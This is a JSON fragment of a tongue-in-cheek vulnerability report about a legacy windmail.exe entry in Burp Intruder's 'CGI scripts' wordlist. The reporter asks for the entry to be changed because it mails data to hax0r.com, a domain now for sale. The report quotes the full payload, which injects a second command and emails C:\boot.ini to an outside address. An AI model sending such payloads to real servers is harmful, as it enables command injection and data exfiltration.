  "vulnerability_information": "1. Get to your basement, look for that floppy disc copy of windmail.exe\n2. Install windmail.exe on a Windows 98 server (good luck with that)\n3. Run Burp's Intruder payload list `CGI scripts` against the folder `/cgi-bin/` where you installed that nifty windmail.exe\n4. Burp will send the following payload from the wordlist: `WINDMAIL.EXE?%20-n%20c:\\boot.ini%20Hacker@hax0r.com%20|%20dir%20c:\\\\`\n5. Due to the payload, windmail.exe will send the C:\\boot.ini file to the email address Hacker@hax0r.com according to https://seclists.org/bugtraq/2000/Mar/322\n6. hax0r.com is currently up for sale: http://hax0r.com\n\nIf you are going to argue that nobody is running windmail.exe in 2024, why is that entry still in the wordlist? :D\n\nAlthough that's really what happens, don't take this report too serious ;) . Am I the only person in the last 20 years who really went through the wordlist manually? But I would still change that one entry.\n\n## Impact\n\nBurp sends the not-very-confidential file C:\\boot.ini of an exploited server to the e-mail address Hacker@hax0r.com",
